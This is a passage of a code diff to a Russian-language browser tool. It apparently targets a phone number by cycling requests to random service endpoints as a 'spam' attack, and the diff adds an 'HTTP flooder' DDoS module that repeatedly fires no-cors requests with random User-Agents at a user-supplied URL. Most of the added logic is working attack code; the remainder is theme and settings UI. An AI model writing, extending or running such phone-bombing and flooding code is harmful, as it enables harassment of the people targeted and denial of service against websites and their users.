             addLog(`🌀 Цикл ${cycle} / ${totalCycles} — отправка ${requestsPerCycle} запросов...`, 'info');
-            let cycleSuccessCount = 0;
-            // Для каждого цикла выбираем 5 эндпоинтов (можно использовать случайную выборку или последовательную)
-            // Чтобы не повторять одни и те же слишком часто, возьмём slice по индексу, но для универсальности - random sample
+            let cycleSuccess = 0;
             const shuffled = [...endpoints];
             for (let i = shuffled.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
                 [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
             }
-            const selectedEndpoints = shuffled.slice(0, requestsPerCycle);
-            
-            for (let idx = 0; idx < selectedEndpoints.length; idx++) {
-                const endpoint = selectedEndpoints[idx];
-                addLog(`📡 Отправка на ${endpoint.substring(0, 60)}...`, 'info');
-                const result = await sendRequest(endpoint, phone);
+            const selected = shuffled.slice(0, requestsPerCycle);
+            for (let idx = 0; idx < selected.length; idx++) {
+                const ep = selected[idx];
+                addLog(`📡 Отправка на ${ep.substring(0, 60)}...`, 'info');
+                const result = await sendRequest(ep, phone);
                 if (result.ok) {
                     totalSuccess++;
-                    cycleSuccessCount++;
-                    addLog(`✅ Запрос успешен (HTTP ${result.status})`, 'success');
+                    cycleSuccess++;
+                    addLog(`✅ Запрос отправлен`, 'success');
                 } else {
                     totalFailed++;
-                    if (result.corsBlock) {
-                        addLog(`⚠️ Запрос отправлен, но CORS блокирует ответ (${result.error})`, 'error');
-                    } else {
-                        addLog(`❌ Ошибка: ${result.error}`, 'error');
-                    }
+                    addLog(`⚠️ Ошибка: ${result.error}`, 'error');
                 }
-                // небольшая задержка между запросами внутри цикла, чтобы не перегружать
-                await new Promise(r => setTimeout(r, 400));
+                await new Promise(r => setTimeout(r, 300));
             }
-            addLog(`✨ Цикл ${cycle} завершён. Успешно: ${cycleSuccessCount}/${requestsPerCycle}`, 'success');
-            // пауза между циклами (как в оригинале 3 сек)
+            addLog(`✨ Цикл ${cycle} завершён. Успешно: ${cycleSuccess}/${requestsPerCycle}`, 'success');
             if (cycle < totalCycles) {
-                addLog(`⏳ Пауза 3 секунды перед следующим циклом...`, 'info');
+                addLog(`⏳ Пауза 3 сек...`, 'info');
                 await new Promise(r => setTimeout(r, 3000));
             }
         }
-        return { totalSuccess, totalFailed, totalRequests: totalSuccess + totalFailed };
+        return { totalSuccess, totalFailed };
     }
 
     startBtn.addEventListener('click', async () => {
         let phone = phoneInput.value.trim();
         let cycles = parseInt(cyclesInput.value, 10);
         if (isNaN(cycles) || cycles < 1) cycles = 1;
-        if (cycles > 50) cycles = 50;
-
-        if (!phone) {
-            addLog('❌ Введите номер телефона', 'error');
-            return;
-        }
         if (!phone.startsWith('+')) {
-            addLog('❌ Номер должен начинаться с + (международный формат)', 'error');
+            addLog('❌ Номер должен начинаться с +', 'error');
             return;
         }
-
         startBtn.disabled = true;
-        startBtn.textContent = '⏳ СПАМ АКТИВЕН...';
-        addLog(`🚀 СТАРТ спама на номер ${phone} — ${cycles} циклов (каждый цикл = 5 запросов)`, 'info');
-        addLog(`⚠️ ВАЖНО: из-за политики CORS ответы могут быть скрыты, но запросы уходят. Для лучшей работы используйте серверный прокси.`, 'error');
-        
-        const startTime = Date.now();
+        startBtn.textContent = '⏳ АТАКА...';
+        addLog(`🚀 СТАРТ спама на ${phone} — ${cycles} циклов`, 'info');
         const stats = await runSpam(phone, cycles);
-        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        
-        addLog(`🏁 СПАМ ЗАВЕРШЕН за ${elapsed} сек.`, 'success');
-        addLog(`📊 ИТОГО: ✅ Успешных отправок: ${stats.totalSuccess} | ❌ Ошибок/блокировок: ${stats.totalFailed}`, 'info');
-        addLog(`🎯 Всего запросов: ${stats.totalRequests} (${cycles} циклов по 5 запросов)`, 'success');
-        addLog(`🔐 Сделано @coderonov / fragment spam tool`, 'info');
-
+        addLog(`🏁 ГОТОВО. Успешно: ${stats.totalSuccess} | Ошибок: ${stats.totalFailed}`, 'success');
         startBtn.disabled = false;
         startBtn.textContent = '💣 ЗАПУСТИТЬ СПАМ';
     });
 
-    // Генерация партиклов
-    function createParticles() {
-        const container = document.getElementById('particles');
-        const particleCount = 45;
-        for (let i = 0; i < particleCount; i++) {
-            const particle = document.createElement('div');
-            particle.classList.add('particle');
-            const size = Math.random() * 6 + 2;
-            particle.style.width = size + 'px';
-            particle.style.height = size + 'px';
-            particle.style.left = Math.random() * 100 + '%';
-            particle.style.animationDuration = Math.random() * 12 + 6 + 's';
-            particle.style.animationDelay = Math.random() * 8 + 's';
-            particle.style.opacity = Math.random() * 0.4 + 0.1;
-            container.appendChild(particle);
-        }
-    }
-    createParticles();
+    // ======================== DDOS MODULE (HTTP FLOODER) ========================
+    const ddosLog = document.getElementById('ddosLogContainer');
+    const ddosTarget = document.getElementById('ddosTarget');
+    const ddosThreads = document.getElementById('ddosThreads');
+    const ddosDuration = document.getElementById('ddosDuration');
+    const ddosStart = document.getElementById('ddosStartBtn');
 
-    // дополнительный авто-ресайз для мобилок
-    window.addEventListener('resize', () => {});
+    function addDdosLog(msg, type = 'info') {
+        const d = document.createElement('div');
+        d.className = `log-line ${type}`;
+        d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        ddosLog.appendChild(d);
+        ddosLog.scrollTop = ddosLog.scrollHeight;
+    }
+
+    let attackActive = false;
+    let activeRequests = 0;
+
+    async function sendFloodRequest(url) {
+        if (!attackActive) return;
+        activeRequests++;
+        const controllers = [];
+        try {
+            const ctrl = new AbortController();
+            controllers.push(ctrl);
+            setTimeout(() => ctrl.abort(), 4000);
+            await fetch(url, {
+                method: 'GET',
+                mode: 'no-cors',
+                cache: 'no-store',
+                signal: ctrl.signal,
+                headers: { 'User-Agent': getRandomUA(), 'Cache-Control': 'no-cache' }
+            });
+        } catch (e) {}
+        activeRequests--;
+    }
+
+    async function startDDoS() {
+        let url = ddosTarget.value.trim();
+        let threads = parseInt(ddosThreads.value, 10);
+        let duration = parseInt(ddosDuration.value, 10);
+        if (!url) { addDdosLog('❌ Введите URL', 'error'); return; }
+        if (!url.startsWith('http')) url = 'https://' + url;
+        if (isNaN(threads) || threads < 1) threads = 50;
+        if (isNaN(duration) || duration < 5) duration = 30;
+        attackActive = true;
+        ddosStart.disabled = true;
+        ddosStart.textContent = '⚡ АТАКА АКТИВНА...';
+        addDdosLog(`🔥 DDoS атака запущена на ${url} | потоков: ${threads} | длит: ${duration} сек`, 'info');
+        const startTime = Date.now();
+        const interval = setInterval(() => {
+            for (let i = 0; i < threads; i++) {
+                if (!attackActive) break;
+                sendFloodRequest(url).catch(()=>{});
+            }
+        }, 50);
+        setTimeout(() => {
+            attackActive = false;
+            clearInterval(interval);
+            addDdosLog(`✅ Атака завершена через ${duration} секунд. Отправлено ~${activeRequests * 20} запросов`, 'success');
+            ddosStart.disabled = false;
+            ddosStart.textContent = '💥 ЗАПУСТИТЬ DDoS';
+        }, duration * 1000);
+    }
+
+    ddosStart.addEventListener('click', startDDoS);
+
+    // ======================== SETTINGS PANEL & THEMING ========================
+    const settingsIcon = document.getElementById('settingsIcon');
+    const settingsModal = document.getElementById('settingsModal');
+    const closeSettings = document.getElementById('closeSettings');
+    const animSpeedSlider = document.getElementById('animSpeed');
+    const speedVal = document.getElementById('speedVal');
+    const blurSlider = document.getElementById('blurLevel');
+    const blurVal = document.getElementById('blurVal');
+    const gradientFast = document.getElementById('gradientFast');
+    const gradientSlow = document.getElementById('gradientSlow');
+    const gradientStop = document.getElementById('gradientStop');
+
+    let gradientAnimationRunning = true;
+    let gradientSpeed = 12; // seconds
+
+    function applyTheme(themeName) {
+        document.documentElement.setAttribute('data-theme', themeName);
+        localStorage.setItem('frag_theme', themeName);
+        document.querySelectorAll('.theme-btn').forEach(btn => {
+            if (btn.getAttribute('data-theme') === themeName) btn.classList.add('active');
+            else btn.classList.remove('active');
+        });
+    }
+
+    function applyBlur(value) {
+        document.documentElement.style.setProperty('--backdrop-blur', value + 'px');
+        localStorage.setItem('frag_blur', value);
+        blurVal.innerText = value + 'px';
+    }
+
+    function applyAnimSpeed(value) {
+        speedVal.innerText = value + 'ms';
+        document.documentElement.style.setProperty('transition-duration', value + 'ms');
+        localStorage.setItem('frag_anim_speed', value);
+    }
+
+    function setGradientAnimation(speedSec) {
+        const bgAnim = document.querySelector('.bg-animation');
+        if (speedSec === 0) {
+            bgAnim.style.animation = 'none';
+            gradientAnimationRunning = false;
+        } else {
+            bgAnim.style.animation = `gradientShift ${speedSec}s ease infinite`;
+            gradientAnimationRunning = true;
+        }
+        localStorage.setItem('frag_gradient_speed', speedSec);
+    }
+
+    blurSlider.addEventListener('input', (e) => applyBlur(e.target.value));
+    animSpeedSlider.addEventListener('input', (e) => applyAnimSpeed(e.target.value));
+
+    gradientFast.addEventListener('click', () => setGradientAnimation(6));
+    gradientSlow.addEventListener('click', () => setGradientAnimation(18));
+    gradientStop.addEventListener('click', () => setGradientAnimation(0));
+
+    document.querySelectorAll('.theme-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const theme = btn.getAttribute('data-theme');
+            if (theme) applyTheme(theme);
+        });
+    });
+
+    // draggable settings panel
+    let isDragging = false;
+    let offsetX, offsetY;
+    const modalHeader = document.getElementById('settingsHeader');
+    modalHeader.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        offsetX = e.clientX - settingsModal.offsetLeft;
+        offsetY = e.clientY - settingsModal.offsetTop;
+        settingsModal.style.position = 'fixed';
+        settingsModal.style.margin = '0';
+    });
+    window.addEventListener('mousemove', (e) => {
+        if (!isDragging) return;
+        settingsModal.style.left = (e.clientX - offsetX) + 'px';
+        settingsModal.style.top = (e.clientY - offsetY) + 'px';
+        settingsModal.style.right = 'auto';
+        settingsModal.style.bottom = 'auto';
+    });
+    window.addEventListener('mouseup', () => isDragging = false);
+
+    settingsIcon.addEventListener('click', () => {
+        settingsModal.style.display = 'flex';
+    });
+    closeSettings.addEventListener('click', () => {
+        settingsModal.style.display = 'none';
+    });
+
+    // Load saved preferences
+    const savedTheme = localStorage.getItem('frag_theme') || 'dark';
+    const savedBlur = localStorage.getItem('frag_blur') || 12;
+    const savedAnimSpeed = localStorage.getItem('frag_anim_speed') || 300;
+    const savedGradSpeed = localStorage.getItem('frag_gradient_speed');
+
+    applyTheme(savedTheme);
+    applyBlur(parseInt(savedBlur));
+    applyAnimSpeed(parseInt(savedAnimSpeed));
+    if (savedGradSpeed !== null) setGradientAnimation(parseInt(savedGradSpeed));
+    else setGradientAnimation(12);
+
+    // Navigation Tabs
+    document.querySelectorAll('.nav-item').forEach(item => {
+        item.addEventListener('click', () => {
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            item.classList.add('active');
+            document.getElementById(item.dataset.section + '-section').classList.add('active');
+        });
+    });
 </script>
 </body>
 </html>
